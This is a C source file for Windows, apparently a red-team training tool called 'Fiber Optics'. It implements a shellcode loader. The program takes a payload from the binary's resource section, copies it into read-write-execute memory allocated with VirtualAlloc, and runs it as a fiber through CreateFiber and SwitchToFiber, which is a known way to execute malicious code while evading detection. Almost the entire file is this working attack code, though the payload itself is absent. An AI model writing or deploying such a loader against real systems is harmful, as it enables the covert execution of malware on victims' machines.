#include <Windows.h>
#include <stdio.h>
#include "resource.h"

int main() {
    LPVOID PrimaryFiberAddress = NULL,
        ShellcodeFiberAddress = NULL;
    PVOID pShellcode = NULL;

    printf("\t\t\t ###########################################################\n");
    printf("\t\t\t #         Fiber Optics - Designed By Cuong Nguyen         #\n");
    printf("\t\t\t ###########################################################\n\n");

    printf("[i] This Program Will Execute A Payload via Fiber\n");
    printf("[#] Press <Enter> To Continue");
    getchar();

    // Find the resource in the .rsrc section
    HRSRC hShellcodeRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);

    if (hShellcodeRsrc == NULL) {
        printf("[!] FindResourceW for Shellcode Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Load the resource into memory
    HGLOBAL hShellcodeGlobal = LoadResource(NULL, hShellcodeRsrc);
    if (hShellcodeGlobal == NULL) {
        printf("[!] LoadResource for Shellcode Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Obtain a pointer to the beginning of the resource data
    pShellcode = LockResource(hShellcodeGlobal);
    if (pShellcode == NULL) {
        printf("[!] LockResource for Shellcode Failed With Error : %d \n", GetLastError());
        return -1;
    }

    SIZE_T sShellcodeSize = SizeofResource(NULL, hShellcodeRsrc);

    printf("[i] Shellcode Loaded From Resource, Size: %Iu\n", sShellcodeSize);
    printf("[i] Address Of Shellcode: %p\n", pShellcode);
    printf("[#] Press <Enter> To Allocate Executable Memory Using VirtuaAlloc");
    getchar();

    // Allocate executable memory using VirtualAlloc
    PVOID pExecutableMemory = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pExecutableMemory == NULL) {
        printf("[!] VirtualAlloc for Executable Memory Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[i] Temporary Executable Memory address is : 0x%p \n", pExecutableMemory);
    printf("[#] Press <Enter> To Copy Shellcode In The Executable Memory Region\n");
    printf("\n[x]---> Shellcode Successfully Copied <---[x]\n");
    getchar();
    // Copy the shellcode to the executable memory
    memcpy(pExecutableMemory, pShellcode, sShellcodeSize);

    printf("[i] Press <Enter> to Create Fiber Object");
    getchar();
    // Create a fiber object, stack, and set up execution to begin at the specified start address (pExecutableMemory). This fiber is not yet scheduled for execution.
    if (!(ShellcodeFiberAddress = CreateFiber(0x100000, (LPFIBER_START_ROUTINE)pExecutableMemory, NULL))) {
        printf("[!] CreateFiber for Shellcode Failed With Error: %d \n", GetLastError());
        return -1;
    }

    printf("[i] Shellcode Fiber Created At Address : 0x%p \n", ShellcodeFiberAddress);

    // Converts the current (main) thread into a fiber
    if (!(PrimaryFiberAddress = ConvertThreadToFiber(NULL))) {
        printf("[!] ConvertThreadToFiber Failed With Error: %d \n", GetLastError());
        return -1;
    }

    printf("[i] Primary Fiber Created At Address : 0x%p \n", PrimaryFiberAddress);
    printf("[#] Press <Enter> To Execute Payload");
    getchar();

    // Schedules the shellcode fiber. "SwitchToFiber" can only be called from another fiber, which is in this case the 'PrimaryFiberAddress' fiber.
    SwitchToFiber(ShellcodeFiberAddress);

    // Check if SwitchToFiber was successful
    DWORD switchError = GetLastError();
    if (ShellcodeFiberAddress == NULL || switchError != ERROR_SUCCESS) {
        printf("[!] Failed to switch to shellcode fiber. Error: %d\n", switchError);
        return -1;
    }

    // Allow some time for the payload to execute
    Sleep(5000);  // Sleep for 5 seconds

    printf("[#] Press <Enter> To Quit ...");
    getchar();

    // Free the allocated memory
    VirtualFree(pExecutableMemory, 0, MEM_RELEASE);

    return 0;
}
